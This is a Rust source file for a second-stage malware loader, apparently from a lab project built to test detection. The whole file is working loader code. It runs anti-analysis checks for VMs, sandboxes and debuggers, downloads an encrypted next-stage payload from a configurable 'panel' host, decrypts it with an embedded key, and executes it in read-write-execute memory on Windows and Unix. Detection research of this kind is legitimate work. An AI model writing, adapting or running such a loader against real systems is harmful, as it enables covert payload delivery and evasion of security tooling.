//! Stage 2 Loader
//!
//! Anti-analysis gate that:
//! 1. Checks for VM/sandbox/debugger
//! 2. If clean, fetches and decrypts Stage 3
//! 3. Passes control to Stage 3
//!
//! Detection artifacts:
//! - Anti-analysis API calls (ETW, Sysmon)
//! - HTTP request to staging endpoint
//! - Memory execution

mod constants;
mod crypto;
mod anti_analysis;

use std::process::ExitCode;

/// Embedded configuration (patched by builder)
struct Stage2Config {
    panel_host: &'static str,
    panel_port: u16,
    psk: &'static str,
    salt: &'static [u8],
}

/// Default config for testing
const CONFIG: Stage2Config = Stage2Config {
    panel_host: "127.0.0.1",
    panel_port: 8080,
    psk: "oxide-lab-psk",
    salt: b"oxide-lab-salt-must-be-32-bytes!",
};

fn main() -> ExitCode {
    // Step 1: Anti-analysis checks
    if let Err(e) = anti_analysis::check_environment() {
        // Analysis environment detected - exit silently
        // In real malware, this would be logged for debugging
        // Here we just exit with non-zero status for detection testing
        eprintln!("Environment check failed: {}", e);
        return ExitCode::from(1);
    }

    // Step 2: Fetch encrypted Stage 3
    let stage3_encrypted = match fetch_stage3() {
        Ok(data) => data,
        Err(e) => {
            eprintln!("Failed to fetch Stage 3: {}", e);
            return ExitCode::from(2);
        }
    };

    // Step 3: Decrypt Stage 3
    let stage3_payload = match crypto::decrypt_payload(
        CONFIG.psk,
        CONFIG.salt,
        &stage3_encrypted,
    ) {
        Ok(data) => data,
        Err(e) => {
            eprintln!("Failed to decrypt Stage 3: {}", e);
            return ExitCode::from(3);
        }
    };

    // Step 4: Execute Stage 3 in memory
    if let Err(e) = run_in_memory(&stage3_payload) {
        eprintln!("Failed to run Stage 3: {}", e);
        return ExitCode::from(4);
    }

    ExitCode::SUCCESS
}

/// Fetch encrypted Stage 3 from panel.
fn fetch_stage3() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let url = format!(
        "http://{}:{}/api/staging/3",
        CONFIG.panel_host,
        CONFIG.panel_port
    );

    let response = reqwest::blocking::get(&url)?;
    if !response.status().is_success() {
        return Err(format!("HTTP {}", response.status()).into());
    }

    Ok(response.bytes()?.to_vec())
}

/// Run payload in memory.
fn run_in_memory(payload: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(windows)]
    {
        run_windows(payload)
    }
    #[cfg(unix)]
    {
        run_unix(payload)
    }
}

#[cfg(windows)]
fn run_windows(payload: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    use windows::Win32::System::Memory::*;
    use std::ptr;

    unsafe {
        // Allocate RWX memory
        let mem = VirtualAlloc(
            Some(ptr::null()),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if mem.is_null() {
            return Err("VirtualAlloc failed".into());
        }

        // Copy payload
        ptr::copy_nonoverlapping(payload.as_ptr(), mem as *mut u8, payload.len());

        // Run as function
        let entry: extern "C" fn() = std::mem::transmute(mem);
        entry();

        // Cleanup (may not reach here)
        let _ = VirtualFree(mem, 0, MEM_RELEASE);
    }

    Ok(())
}

#[cfg(unix)]
fn run_unix(payload: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    use std::ptr;

    const PROT_READ: i32 = 0x1;
    const PROT_WRITE: i32 = 0x2;
    const PROT_EXEC: i32 = 0x4;
    const MAP_PRIVATE: i32 = 0x02;
    const MAP_ANONYMOUS: i32 = 0x20;

    extern "C" {
        fn mmap(
            addr: *mut std::ffi::c_void,
            length: usize,
            prot: i32,
            flags: i32,
            fd: i32,
            offset: i64,
        ) -> *mut std::ffi::c_void;
        fn munmap(addr: *mut std::ffi::c_void, length: usize) -> i32;
    }

    unsafe {
        let mem = mmap(
            ptr::null_mut(),
            payload.len(),
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1,
            0,
        );

        if mem == (-1isize as *mut std::ffi::c_void) {
            return Err("mmap failed".into());
        }

        // Copy payload
        ptr::copy_nonoverlapping(payload.as_ptr(), mem as *mut u8, payload.len());

        // Run as function
        let entry: extern "C" fn() = std::mem::transmute(mem);
        entry();

        // Cleanup (may not reach here)
        munmap(mem, payload.len());
    }

    Ok(())
}
